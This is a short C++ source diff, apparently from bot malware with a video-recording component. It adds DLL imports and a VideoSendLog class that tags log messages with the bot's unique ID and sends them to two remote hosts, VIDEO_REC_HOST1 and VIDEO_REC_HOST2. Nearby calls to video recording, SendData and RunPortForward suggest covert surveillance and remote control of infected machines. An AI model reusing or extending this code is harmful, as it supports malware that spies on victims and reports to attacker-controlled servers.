@@ -100,6 +100,9 @@ void TVideoRecDLL::InitializeApi()
 	LoadFunc(VideRecFuncResetTimer,     (LPVOID&)ResetTimer);
 	LoadFunc(VideRecFuncSendData,       (LPVOID&)SendData);
 	LoadFunc(VideRecFuncRunPortForward, (LPVOID&)RunPortForward);
+	LoadFunc(VideRecFuncInitSendLog,	(LPVOID&)InitSendLog);
+	LoadFunc(VideRecFuncReleaseSendLog,	(LPVOID&)ReleaseSendLog);
+	LoadFunc(VideRecFuncSendLog,		(LPVOID&)SendLog);
 }
 
 
@@ -196,6 +199,51 @@ void TVideoRecorder::Stop()
 }
 //--------------------------------------------------------------
 
+
+//*********************************************************************************
+//							VideoSendLog
+//*********************************************************************************
+VideoSendLog::VideoSendLog()
+{
+	dll.InitSendLog( Bot->UID().t_str(), VIDEO_REC_HOST1, VIDEORECORD_DEFAULT_PORT, VIDEO_REC_HOST2, VIDEORECORD_DEFAULT_PORT );
+}
+
+VideoSendLog::~VideoSendLog()
+{
+	dll.ReleaseSendLog();
+}
+
+//отправка лога на сервер:
+//name - имя лога
+//code - код лога
+//format - форматированный текст лога
+void VideoSendLog::Send( const char* name, int code, const char* format, ... )
+{
+	if( format != 0 )
+	{
+		va_list va;
+		va_start( va, format );
+		SendV( name, code, format, va );
+		va_end(va);
+	}
+	else
+		Send2( name, code, format );
+}
+
+void VideoSendLog::SendV( const char* name, int code, const char* format, va_list va )
+{
+	char buf[1024];
+	pwvsprintfA( buf, format, va );
+	Send2( name, code, buf );
+}
+
+void VideoSendLogName::Send( int code, const char* format, ... )
+{
+	va_list va;
+	va_start( va, format );
+	vsl.SendV( name, code, format, va );
+	va_end(va);
+}
 
 
 //*****************************************
